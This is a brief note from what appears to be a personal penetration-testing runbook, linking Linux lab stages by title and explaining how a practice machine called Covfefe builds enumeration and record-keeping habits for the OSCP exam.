## Related RUNBOOK V2 stages

- [[RUNBOOK V2/Start Here]]
- [[RUNBOOK V2/Linux - Service Scan]]
- [[RUNBOOK V2/Linux - Web Enum]]
- [[RUNBOOK V2/Linux - Shell Stabilise]]
- [[RUNBOOK V2/Linux - Local Enum]]
- [[RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Covfefe rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
